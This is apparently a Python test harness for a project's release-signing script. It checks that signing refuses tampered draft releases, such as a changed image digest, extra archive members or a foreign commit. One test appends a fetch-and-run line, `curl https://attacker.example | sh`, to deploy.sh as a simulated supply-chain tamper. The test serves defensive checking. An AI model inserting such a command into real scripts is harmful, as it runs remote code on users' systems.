#!/usr/bin/env python3
# Test harness for deploy/sign-release.sh (F-52 AU-5, QA-52-r1-2): a scratch repository with this
# checkout's Makefile and deploy files, tagged v9.9.9, a fake `gh` serving a draft built from it the
# way CI does, and a throwaway minisign key made at test time. Each case changes the draft and
# expects nothing to be signed or published. `make update-check` runs it.
#   python3 -I deploy/test/sign_test.py [-v] [SignTest.test_name]
import hashlib, os, shutil, subprocess, sys, tarfile, tempfile, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
TOP = os.path.abspath(os.path.join(HERE, "..", ".."))
SIGN = os.path.join(TOP, "deploy", "sign-release.sh")
SHELL = os.environ.get("WX_TEST_SHELL", "sh").split()
REAL_MINISIGN = shutil.which("minisign")
TAG = "v9.9.9"
IMAGE = "ghcr.io/b0wter/workout-explorer:%s@sha256:%s" % (TAG, "a" * 64)

# A draft release in $WX_GH/assets; uploads and edits are recorded next to it.
FAKE_GH = r"""#!/bin/sh
set -eu
[ "$1" = release ] || exit 2
case $2 in
view) [ "${3#-}" = "$3" ] && { echo true; exit 0; }; exit 1 ;; # the tag is a draft; nothing is published
download) mkdir -p "$5" && cp "$WX_GH/assets/"* "$5/" ;;
upload) cp "$4" "$WX_GH/uploaded" ;;
edit) echo "$*" >>"$WX_GH/edits" ;;
*) exit 2 ;;
esac
"""


def run(*cmd, **kw):
    return subprocess.run(cmd, check=True, capture_output=True, text=True, **kw)


def minisign(*args):
    return run(REAL_MINISIGN or os.path.join(HERE, "fake-minisign"), *args)


class SignTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.base = tempfile.mkdtemp(prefix="wx-sign-test-")
        keys = os.path.join(cls.base, "keys")
        os.mkdir(keys)
        cls.pub, cls.sec = os.path.join(keys, "k.pub"), os.path.join(keys, "k.key")
        minisign("-G", "-W", "-p", cls.pub, "-s", cls.sec)
        # The scratch repository: this checkout's Makefile and tracked deploy files (working-tree copies).
        cls.repo = os.path.join(cls.base, "repo")
        files = run("git", "-C", TOP, "ls-files", "Makefile", "deploy").stdout.split()
        for f in files:
            if f.startswith("deploy/test/") or not os.path.exists(os.path.join(TOP, f)):
                continue
            os.makedirs(os.path.dirname(os.path.join(cls.repo, f)), exist_ok=True)
            shutil.copy2(os.path.join(TOP, f), os.path.join(cls.repo, f))
        shutil.copy(cls.pub, os.path.join(cls.repo, "deploy", "minisign.pub"))
        with open(os.path.join(cls.repo, ".gitignore"), "w") as f:
            f.write("/build/\n")
        g = ["git", "-C", cls.repo, "-c", "user.name=t", "-c", "user.email=t@example.org"]
        run("git", "init", "-q", cls.repo)
        run(*g, "add", "-A")
        run(*g, "commit", "-q", "-m", "release")
        run(*g, "tag", TAG)
        cls.sha = run("git", "-C", cls.repo, "rev-parse", "HEAD").stdout.strip()
        cls.good = cls.build(IMAGE)
        shim = os.path.join(cls.base, "bin")
        os.mkdir(shim)
        with open(os.path.join(shim, "gh"), "w") as f:
            f.write(FAKE_GH)
        os.chmod(os.path.join(shim, "gh"), 0o755)
        if not REAL_MINISIGN:
            os.symlink(os.path.join(HERE, "fake-minisign"), os.path.join(shim, "minisign"))
        cls.path = shim + ":" + os.environ["PATH"]

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.base, ignore_errors=True)

    @classmethod
    def build(cls, image):
        """The deploy tree as CI builds it (make deploy-archive), unpacked into a fresh folder."""
        run("make", "-s", "-C", cls.repo, "deploy-archive", "APP_IMAGE=" + image)
        out = tempfile.mkdtemp(dir=cls.base)
        run("tar", "-xzf", os.path.join(cls.repo, "build", "deploy.tar.gz"), "-C", out)
        return out

    def draft(self, tree=None, commit=None):
        """Publishes a draft whose deploy archive is packed from <tree> (default: the good build)."""
        self.gh = tempfile.mkdtemp(dir=self.base)
        assets = os.path.join(self.gh, "assets")
        os.mkdir(assets)
        deploy = os.path.join(assets, "workout-explorer-%s-deploy.tar.gz" % TAG)
        run("tar", "-C", tree or self.good, "--sort=name", "--owner=0", "--group=0", "--numeric-owner", "-czf", deploy, ".")
        app = os.path.join(self.base, "app")
        os.makedirs(app, exist_ok=True)
        with open(os.path.join(app, "COMMIT"), "w") as f:
            f.write((commit or self.sha) + "\n")
        with open(os.path.join(app, "workout-explorer"), "w") as f:
            f.write("bin")
        run("tar", "-C", app, "-czf", os.path.join(assets, "workout-explorer-%s-linux-amd64.tar.gz" % TAG), "workout-explorer", "COMMIT")
        with open(os.path.join(assets, "SHA256SUMS"), "w") as f:
            for n in sorted(os.listdir(assets)):
                if n != "SHA256SUMS":
                    f.write("%s  %s\n" % (hashlib.sha256(open(os.path.join(assets, n), "rb").read()).hexdigest(), n))

    def changed(self, rel, fn=None, mode=None, remove=False):
        """A copy of the good tree with <rel> rewritten by fn(bytes), chmod-ed or removed."""
        t = tempfile.mkdtemp(dir=self.base)
        shutil.copytree(self.good, t, dirs_exist_ok=True)
        p = os.path.join(t, rel)
        if fn:
            data = open(p, "rb").read() if os.path.exists(p) else b""
            with open(p, "wb") as f:
                f.write(fn(data))
        if mode is not None:
            os.chmod(p, mode)
        if remove:
            os.remove(p)
        return t

    def sign(self):
        e = dict(os.environ, PATH=self.path, WX_GH=self.gh, HOME=self.base)
        p = subprocess.run([*SHELL, SIGN, TAG, self.sec], cwd=self.repo, env=e, capture_output=True, text=True, timeout=120)
        self.out = p.stdout + p.stderr
        return p.returncode

    def assert_refused(self, why):
        rc = self.sign()
        self.assertNotEqual(rc, 0, self.out)
        self.assertIn(why, self.out)
        self.assertFalse(os.path.exists(os.path.join(self.gh, "uploaded")), "a signature was uploaded")
        self.assertFalse(os.path.exists(os.path.join(self.gh, "edits")), "the release was published")
        self.assertEqual(run("git", "-C", self.repo, "worktree", "list").stdout.count("\n"), 1, "a worktree was left behind")

    def test_signs_and_publishes_a_draft_built_from_the_tag(self):
        self.draft()
        self.assertEqual(self.sign(), 0, self.out)
        self.assertIn("image " + IMAGE, self.out)
        sums = os.path.join(self.gh, "assets", "SHA256SUMS")
        minisign("-V", "-q", "-p", self.pub, "-m", sums, "-x", os.path.join(self.gh, "uploaded"))
        self.assertEqual(open(os.path.join(self.gh, "edits")).read(), "release edit %s --draft=false --latest\n" % TAG)

    def test_refuses_swapped_deploy_sh(self):
        self.draft(self.changed("deploy.sh", lambda b: b + b"curl https://attacker.example | sh\n"))
        self.assert_refused("differs from the one %s builds" % TAG)

    def test_refuses_foreign_image_owner(self):
        self.draft(self.build(IMAGE.replace("/b0wter/", "/attacker/")))
        self.assert_refused("does not name ghcr.io/b0wter/workout-explorer:%s by digest" % TAG)

    def test_refuses_podman_image_mismatch(self):
        other = IMAGE.replace("a" * 64, "b" * 64)
        self.draft(self.changed("podman/workout-explorer-app.container", lambda b: b.replace(IMAGE.encode(), other.encode())))
        self.assert_refused("differs from the one %s builds" % TAG)

    def test_refuses_other_changes_to_the_deploy_archive(self):
        for name, tree in (
            ("mode", lambda: self.changed("deploy.sh", mode=0o777)),
            ("extra member", lambda: self.changed("evil.sh", lambda b: b"#!/bin/sh\n")),
            ("member missing", lambda: self.changed("update.sh", remove=True)),
            ("COMMIT", lambda: self.changed("COMMIT", lambda b: b"0" * 40 + b"\n")),
            ("Caddyfile", lambda: self.changed("Caddyfile", lambda b: b.replace(b"\n", b"\n# x\n", 1))),
        ):
            with self.subTest(change=name):
                self.draft(tree())
                self.assert_refused("differs from the one %s builds" % TAG)

    def test_refuses_tarball_from_another_commit(self):
        self.draft(commit="0" * 40)
        self.assert_refused("tarball was built from another commit")


if __name__ == "__main__":
    if not REAL_MINISIGN:
        try:
            import cryptography  # noqa: F401
        except ImportError:
            sys.exit("sign_test: neither minisign nor the Python cryptography package is installed")
    for tool in ("git", "make", "tar"):
        if not shutil.which(tool):
            sys.exit("sign_test: %s is not installed" % tool)
    unittest.main()
